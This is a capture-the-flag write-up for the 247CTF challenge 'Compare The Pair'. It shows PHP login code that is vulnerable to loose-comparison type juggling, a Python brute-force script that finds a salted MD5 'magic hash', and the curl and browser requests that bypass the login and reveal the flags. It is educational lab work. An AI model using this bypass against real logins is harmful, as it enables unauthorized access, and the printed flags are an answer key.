# Web: Compare The Pair

## Previous Flag
```
247CTF{6c91b7f7f12c852f892293d16dba0148}
```

## Goal
Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?

## What I learned
```
MD5 is practically irreversible
php loose comparision vulnerability == vs === (strict) also called type juggling
Can edit php variables in browser bar

Send only suffix (abr1R) as password parameter. 
The server does md5($salt . $_GET['password']) where $salt is f789bbc328a3d1a3.
The server computes md5("f789bbc328a3d1a3abr1R") (the same string as f789bbc328a3d1a3abr1R)
```

## Side Quest
```
https://www.programiz.com/php/online-compiler/              php -a
main.php
<?php
echo md5("f789bbc328a3d1a3"."abr1R")
?>

Output:
0e918704785736777877278345014851

=== Code Execution Successful ===
```

## Solution
```
START CHALLENGE

<?php
  require_once('flag.php');                                                             # import flag value
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){     # . is string concat in PHP
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>

AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/env python3
# Brute-force search for an input suffix that, when appended to `prefix`
# and MD5-hashed, produces a hexadecimal digest that looks like "0e<digits>"
# (a pattern historically used to exploit PHP loose comparison).
#
# WARNING: This search is exponential in `max_len` and `alphabet` size.
# Use small max_len or a reduced alphabet for practical runs.

from itertools import product
import hashlib

# The known prefix (salt) that will be prepended to each candidate suffix.
prefix = "f789bbc328a3d1a3"

# Characters to try for the candidate suffix (letters + digits).
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Maximum length of the candidate suffix to try (0..max_len inclusive).
# The number of combinations is len(alphabet)**max_len (exponential).
max_len = 6

def find_magic(prefix, alphabet, max_len):
    """
    Try all candidate suffixes of length 0..max_len from `alphabet`.
    For each candidate form the string s = prefix + candidate,
    compute MD5(s), and check whether the hex digest matches the pattern:
      starts with "0e" and the remaining characters are all digits.
    If a match is found, print and return the matching string and digest.
    """
    # iterate over lengths from 0 (empty suffix) up to max_len
    for length in range(0, max_len + 1):
        print(f"Trying length {length}...")
        # product(alphabet, repeat=length) yields all tuples of characters
        # of the given length (e.g., ('a','b','1') for length==3).
        for combo in product(alphabet, repeat=length):
            # join the tuple into a string suffix, e.g. ('a','b') -> "ab"
            candidate = ''.join(combo)
            # construct the full string to hash: prefix + candidate
            s = prefix + candidate
            # compute MD5 hex digest of the bytes of the string
            h = hashlib.md5(s.encode()).hexdigest()
            # check two conditions:
            #  1) digest starts with "0e"
            #  2) every character after "0e" is a decimal digit (0-9)
            # The second condition ensures the digest looks numeric like "0e12345"
            if h.startswith("0e") and h[2:].isdigit():
                # when a match is found, print details and return them
                print("FOUND:", s)
                print("digest:", h)
                return s, h
    # if we exhaust the search space without finding a match, print a message
    print("No match found up to length", max_len)
    return None

if __name__ == "__main__":
    # Run the search when the script is executed directly.
    find_magic(prefix, alphabet, max_len)
    
AsianHacker-picoctf@webshell:~$ chmod u+x pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ time ./pythonScript.py ⌨️❤️
Trying length 0...
Trying length 1...
Trying length 2...
Trying length 3...
Trying length 4...
Trying length 5...
FOUND: f789bbc328a3d1a3abr1R 👀
digest: 0e918704785736777877278345014851

real    1m2.508s
user    0m15.565s
sys     0m0.072s

Method 1: Browser: https://a63e174674386fe8.247ctf.com/?password=abr1R
247CTF{76fbce3909b3129536bb396fea3a9879} 🔐<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>

Method 2: curl
AsianHacker-picoctf@webshell:/tmp$ curl -i 'https://a63e174674386fe8.247ctf.com/?password=abr1R' ⌨️
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 09 Oct 2025 21:27:37 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1821
Connection: keep-alive
Vary: Accept-Encoding

247CTF{76fbce3909b3129536bb396fea3a9879} 🔐<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;</span><span style="color: #007700">require_once(</span><span style="color: #DD0000">'flag.php'</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$password_hash&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"0e902564435691274142490923013038"</span><span style="color: #007700">;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$salt&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"f789bbc328a3d1a3"</span><span style="color: #007700">;<br />&nbsp;&nbsp;if(isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'password'</span><span style="color: #007700">])&nbsp;&amp;&amp;&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">(</span><span style="color: #0000BB">$salt&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'password'</span><span style="color: #007700">])&nbsp;==&nbsp;</span><span style="color: #0000BB">$password_hash</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">$flag</span><span style="color: #007700">;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">true</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
</code>
```

## Flag
247CTF{76fbce3909b3129536bb396fea3a9879}

## Continue
[Continue](../247ctf/WebFlagAuthoriser.md)